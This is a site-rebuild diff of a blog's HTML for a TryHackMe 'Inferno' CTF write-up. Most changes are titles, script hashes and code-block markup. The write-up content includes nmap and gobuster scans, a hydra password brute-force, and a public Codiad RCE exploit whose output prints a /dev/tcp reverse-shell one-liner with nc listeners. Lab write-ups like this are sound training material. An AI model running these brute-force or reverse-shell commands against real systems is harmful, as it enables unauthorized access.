@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Inferno [TryHackMe] – Blog</title>
+    <title>Inferno [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="Inferno [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/inferno/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/inferno/icon.png">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/inferno/icon.png">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="Inferno [TryHackMe]">
     <meta property="twitter:description" content="Real Life machine vs CTF. The machine is designed to be real-life and is perfect for newbies starting out in penetration testing">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1811,7 +1811,7 @@
 The output of the scan can be seen below:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1873,67 +1873,67 @@ The output of the scan can be seen below:</p>
 </span><span class="lnt">60
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -v -A -T4 10.10.241.114
-
-Nmap scan report <span class="k">for</span> 10.10.241.114
-Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
-Not shown: <span class="m">958</span> closed ports
-PORT      STATE SERVICE           VERSION
-21/tcp    open  ftp?
-22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 <span class="o">(</span>ED25519<span class="o">)</span>
-23/tcp    open  telnet?
-25/tcp    open  smtp?
-<span class="p">|</span>_smtp-commands: Couldn<span class="s1">&#39;t establish connection on port 25
-</span><span class="s1">80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))
-</span><span class="s1">| http-methods: 
-</span><span class="s1">|_  Supported Methods: POST OPTIONS HEAD GET
-</span><span class="s1">|_http-server-header: Apache/2.4.29 (Ubuntu)
-</span><span class="s1">|_http-title: Dante&#39;</span>s Inferno
-88/tcp    open  kerberos-sec?
-106/tcp   open  pop3pw?
-110/tcp   open  pop3?
-389/tcp   open  ldap?
-443/tcp   open  https?
-464/tcp   open  kpasswd5?
-636/tcp   open  ldapssl?
-777/tcp   open  multiling-http?
-783/tcp   open  spamassassin?
-808/tcp   open  ccproxy-http?
-873/tcp   open  rsync?
-1001/tcp  open  webpush?
-1236/tcp  open  bvcontrol?
-1300/tcp  open  h323hostcallsc?
-2000/tcp  open  cisco-sccp?
-2003/tcp  open  finger?
-<span class="p">|</span>_finger: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
-2121/tcp  open  ccproxy-ftp?
-2601/tcp  open  zebra?
-2602/tcp  open  ripd?
-2604/tcp  open  ospfd?
-2605/tcp  open  bgpd?
-2607/tcp  open  connection?
-2608/tcp  open  wag-service?
-4224/tcp  open  xtell?
-5051/tcp  open  ida-agent?
-5432/tcp  open  postgresql?
-5555/tcp  open  freeciv?
-5666/tcp  open  nrpe?
-6346/tcp  open  gnutella?
-6566/tcp  open  sane-port?
-6667/tcp  open  irc?
-<span class="p">|</span>_irc-info: Unable to open connection
-8021/tcp  open  ftp-proxy?
-8081/tcp  open  blackice-icecap?
-8088/tcp  open  radan-http?
-9418/tcp  open  git?
-10000/tcp open  snet-sensor-mgmt?
-10082/tcp open  amandaidx?
-No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v -A -T4 10.10.241.114
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.241.114
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">958</span> closed ports
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE           VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp?
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">23/tcp    open  telnet?
+</span></span><span class="line"><span class="cl">25/tcp    open  smtp?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: Couldn<span class="s1">&#39;t establish connection on port 25
+</span></span></span><span class="line"><span class="cl"><span class="s1">80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))
+</span></span></span><span class="line"><span class="cl"><span class="s1">| http-methods: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_  Supported Methods: POST OPTIONS HEAD GET
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Dante&#39;</span>s Inferno
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec?
+</span></span><span class="line"><span class="cl">106/tcp   open  pop3pw?
+</span></span><span class="line"><span class="cl">110/tcp   open  pop3?
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap?
+</span></span><span class="line"><span class="cl">443/tcp   open  https?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl?
+</span></span><span class="line"><span class="cl">777/tcp   open  multiling-http?
+</span></span><span class="line"><span class="cl">783/tcp   open  spamassassin?
+</span></span><span class="line"><span class="cl">808/tcp   open  ccproxy-http?
+</span></span><span class="line"><span class="cl">873/tcp   open  rsync?
+</span></span><span class="line"><span class="cl">1001/tcp  open  webpush?
+</span></span><span class="line"><span class="cl">1236/tcp  open  bvcontrol?
+</span></span><span class="line"><span class="cl">1300/tcp  open  h323hostcallsc?
+</span></span><span class="line"><span class="cl">2000/tcp  open  cisco-sccp?
+</span></span><span class="line"><span class="cl">2003/tcp  open  finger?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_finger: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl">2121/tcp  open  ccproxy-ftp?
+</span></span><span class="line"><span class="cl">2601/tcp  open  zebra?
+</span></span><span class="line"><span class="cl">2602/tcp  open  ripd?
+</span></span><span class="line"><span class="cl">2604/tcp  open  ospfd?
+</span></span><span class="line"><span class="cl">2605/tcp  open  bgpd?
+</span></span><span class="line"><span class="cl">2607/tcp  open  connection?
+</span></span><span class="line"><span class="cl">2608/tcp  open  wag-service?
+</span></span><span class="line"><span class="cl">4224/tcp  open  xtell?
+</span></span><span class="line"><span class="cl">5051/tcp  open  ida-agent?
+</span></span><span class="line"><span class="cl">5432/tcp  open  postgresql?
+</span></span><span class="line"><span class="cl">5555/tcp  open  freeciv?
+</span></span><span class="line"><span class="cl">5666/tcp  open  nrpe?
+</span></span><span class="line"><span class="cl">6346/tcp  open  gnutella?
+</span></span><span class="line"><span class="cl">6566/tcp  open  sane-port?
+</span></span><span class="line"><span class="cl">6667/tcp  open  irc?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_irc-info: Unable to open connection
+</span></span><span class="line"><span class="cl">8021/tcp  open  ftp-proxy?
+</span></span><span class="line"><span class="cl">8081/tcp  open  blackice-icecap?
+</span></span><span class="line"><span class="cl">8088/tcp  open  radan-http?
+</span></span><span class="line"><span class="cl">9418/tcp  open  git?
+</span></span><span class="line"><span class="cl">10000/tcp open  snet-sensor-mgmt?
+</span></span><span class="line"><span class="cl">10082/tcp open  amandaidx?
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Analyzing the output we will find that only two ports are legitimate, <strong>22</strong> (ssh) and <strong>80</strong> (http).<br />
 Because we don’t have ssh credentials yet, let&rsquo;s visit port 80 in our browser.</p>
@@ -1952,7 +1952,7 @@ Nothing interesting can be found in the page source.</p>
 <h3 id="directory-brute-forcing">Directory Brute-Forcing</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1973,26 +1973,26 @@ Nothing interesting can be found in the page source.</p>
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -e -u http://10.10.241.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.241.114
-<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
-<span class="o">[</span>+<span class="o">]</span> Extensions:     bak,old,js,php,txt,html
-<span class="o">[</span>+<span class="o">]</span> Expanded:       <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/02/16 13:23:36 Starting <span class="nv">gobuster</span>
-<span class="o">===============================================================</span>
-/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
-/inferno <span class="o">(</span>Status: 401<span class="o">)</span>
-/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -e -u http://10.10.241.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.0.1
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.241.114
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:     bak,old,js,php,txt,html
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Expanded:       <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/02/16 13:23:36 Starting <span class="nv">gobuster</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/inferno <span class="o">(</span>Status: 401<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Navigating to <code>/inferno</code> we are prompted to authenticate.</p>
 <p><figure >
@@ -2016,7 +2016,7 @@ inferno</p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2025,14 +2025,14 @@ inferno</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.241.114 -m /inferno http-get
-
-<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">71721995</span> login tries <span class="o">(</span>l:5/p:14344399<span class="o">)</span>, ~4482625 tries per task
-<span class="o">[</span>DATA<span class="o">]</span> attacking http-get://10.10.241.114:80/inferno
-<span class="o">[</span>STATUS<span class="o">]</span> 1745.00 tries/min, <span class="m">1745</span> tries in 00:01h, <span class="m">71720250</span> to <span class="k">do</span> in 685:01h, <span class="m">16</span> active
-<span class="o">[</span>STATUS<span class="o">]</span> 2242.00 tries/min, <span class="m">6726</span> tries in 00:03h, <span class="m">71715269</span> to <span class="k">do</span> in 533:08h, <span class="m">16</span> active
-<span class="o">[</span>80<span class="o">][</span>http-get<span class="o">]</span> host: 10.10.241.114   login: admin   password: <span class="o">[</span>REDACTED<span class="o">]</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.241.114 -m /inferno http-get
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">71721995</span> login tries <span class="o">(</span>l:5/p:14344399<span class="o">)</span>, ~4482625 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking http-get://10.10.241.114:80/inferno
+</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 1745.00 tries/min, <span class="m">1745</span> tries in 00:01h, <span class="m">71720250</span> to <span class="k">do</span> in 685:01h, <span class="m">16</span> active
+</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 2242.00 tries/min, <span class="m">6726</span> tries in 00:03h, <span class="m">71715269</span> to <span class="k">do</span> in 533:08h, <span class="m">16</span> active
+</span></span><span class="line"><span class="cl"><span class="o">[</span>80<span class="o">][</span>http-get<span class="o">]</span> host: 10.10.241.114   login: admin   password: <span class="o">[</span>REDACTED<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>After few minutes valid set of credentials is found.</p>
 <hr />
@@ -2064,7 +2064,7 @@ inferno</p>
 <p>Searching for <strong>Codiad</strong> we will find that it is a web-based IDE framework. Proceed with searching for &ldquo;codiad exploit&rdquo;. We found Github repository with RCE (Remote Code Execute) Exploit for <a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit">Codiad</a>. This exploit let us execute system command on Codiad to get a reverse shell. Clone this repository with <code>git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git</code> and follow the instructions.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2089,36 +2089,36 @@ inferno</p>
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python exploit.py http://10.10.241.114/inferno/ admin <span class="o">[</span>REDACTED<span class="o">]</span> 10.9.149.180 <span class="m">1234</span> linux
-<span class="o">[</span>+<span class="o">]</span> Please execute the following <span class="nb">command</span> on your vps: 
-<span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;/dev/tcp/10.9.149.180/1235 0&gt;&amp;1 2&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> nc -lnvp <span class="m">1234</span>
-nc -lnvp <span class="m">1235</span>
-<span class="o">[</span>+<span class="o">]</span> Please confirm that you have <span class="k">done</span> the two <span class="nb">command</span> above <span class="o">[</span>y/n<span class="o">]</span>
-<span class="o">[</span>Y/n<span class="o">]</span> y
-<span class="o">[</span>+<span class="o">]</span> Starting...
-<span class="o">[</span>+<span class="o">]</span> Login Content : &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
-&lt;html&gt;&lt;head&gt;
-&lt;title&gt;401 Unauthorized&lt;/title&gt;
-&lt;/head&gt;&lt;body&gt;
-&lt;h1&gt;Unauthorized&lt;/h1&gt;
-&lt;p&gt;This server could not verify that you
-are authorized to access the document
-requested.  Either you supplied the wrong
-credentials <span class="o">(</span>e.g., bad password<span class="o">)</span>, or your
-browser doesn<span class="err">&#39;</span>t understand how to supply
-the credentials required.&lt;/p&gt;
-&lt;hr&gt;
-&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.241.114 Port 80&lt;/address&gt;
-&lt;/body&gt;&lt;/html&gt;
-
-<span class="o">[</span>-<span class="o">]</span> Login failed! Please check your username and password.
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python exploit.py http://10.10.241.114/inferno/ admin <span class="o">[</span>REDACTED<span class="o">]</span> 10.9.149.180 <span class="m">1234</span> linux
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Please execute the following <span class="nb">command</span> on your vps: 
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;/dev/tcp/10.9.149.180/1235 0&gt;&amp;1 2&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> nc -lnvp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">nc -lnvp <span class="m">1235</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Please confirm that you have <span class="k">done</span> the two <span class="nb">command</span> above <span class="o">[</span>y/n<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Y/n<span class="o">]</span> y
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login Content : &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;
+</span></span><span class="line"><span class="cl">&lt;title&gt;401 Unauthorized&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1&gt;Unauthorized&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;p&gt;This server could not verify that you
+</span></span><span class="line"><span class="cl">are authorized to access the document
+</span></span><span class="line"><span class="cl">requested.  Either you supplied the wrong
+</span></span><span class="line"><span class="cl">credentials <span class="o">(</span>e.g., bad password<span class="o">)</span>, or your
+</span></span><span class="line"><span class="cl">browser doesn<span class="err">&#39;</span>t understand how to supply
+</span></span><span class="line"><span class="cl">the credentials required.&lt;/p&gt;
+</span></span><span class="line"><span class="cl">&lt;hr&gt;
+</span></span><span class="line"><span class="cl">&lt;address&gt;Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.241.114 Port 80&lt;/address&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;&lt;/html&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Login failed! Please check your username and password.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We failed because we have to authenticate two times.<br />
 Modify the exploit command with the following parameters:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2136,54 +2136,54 @@ Modify the exploit command with the following parameters:</p>
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python exploit.py http://admin:<span class="o">[</span>REDACTED<span class="o">]</span>@10.10.241.114/inferno/ admin <span class="o">[</span>REDACTED<span class="o">]</span> 10.9.140.180 <span class="m">1234</span> linux
-<span class="o">[</span>+<span class="o">]</span> Please execute the following <span class="nb">command</span> on your vps: 
-<span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;/dev/tcp/10.9.140.180/1235 0&gt;&amp;1 2&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> nc -lnvp <span class="m">1234</span>
-nc -lnvp <span class="m">1235</span>
-<span class="o">[</span>+<span class="o">]</span> Please confirm that you have <span class="k">done</span> the two <span class="nb">command</span> above <span class="o">[</span>y/n<span class="o">]</span>
-<span class="o">[</span>Y/n<span class="o">]</span> y
-<span class="o">[</span>+<span class="o">]</span> Starting...
-<span class="o">[</span>+<span class="o">]</span> Login Content : <span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;success&#34;</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;admin&#34;</span><span class="o">}}</span>
-<span class="o">[</span>+<span class="o">]</span> Login success!
-<span class="o">[</span>+<span class="o">]</span> Getting writeable path...
-<span class="o">[</span>+<span class="o">]</span> Path Content : <span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;success&#34;</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;inferno&#34;</span>,<span class="s2">&#34;path&#34;</span>:<span class="s2">&#34;\/var\/www\/html\/inferno&#34;</span><span class="o">}}</span>
-<span class="o">[</span>+<span class="o">]</span> Writeable Path : /var/www/html/inferno
-<span class="o">[</span>+<span class="o">]</span> Sending payload...
-<span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;error&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;No Results Returned&#34;</span><span class="o">}</span>
-<span class="o">[</span>+<span class="o">]</span> Exploit finished!
-<span class="o">[</span>+<span class="o">]</span> Enjoy your reverse shell!
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python exploit.py http://admin:<span class="o">[</span>REDACTED<span class="o">]</span>@10.10.241.114/inferno/ admin <span class="o">[</span>REDACTED<span class="o">]</span> 10.9.140.180 <span class="m">1234</span> linux
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Please execute the following <span class="nb">command</span> on your vps: 
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;/dev/tcp/10.9.140.180/1235 0&gt;&amp;1 2&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> nc -lnvp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">nc -lnvp <span class="m">1235</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Please confirm that you have <span class="k">done</span> the two <span class="nb">command</span> above <span class="o">[</span>y/n<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Y/n<span class="o">]</span> y
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login Content : <span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;success&#34;</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;admin&#34;</span><span class="o">}}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login success!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Getting writeable path...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Path Content : <span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;success&#34;</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;inferno&#34;</span>,<span class="s2">&#34;path&#34;</span>:<span class="s2">&#34;\/var\/www\/html\/inferno&#34;</span><span class="o">}}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Writeable Path : /var/www/html/inferno
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Sending payload...
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;error&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;No Results Returned&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Exploit finished!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enjoy your reverse shell!
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Do not forget to run the two provided commands in the separate terminals.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
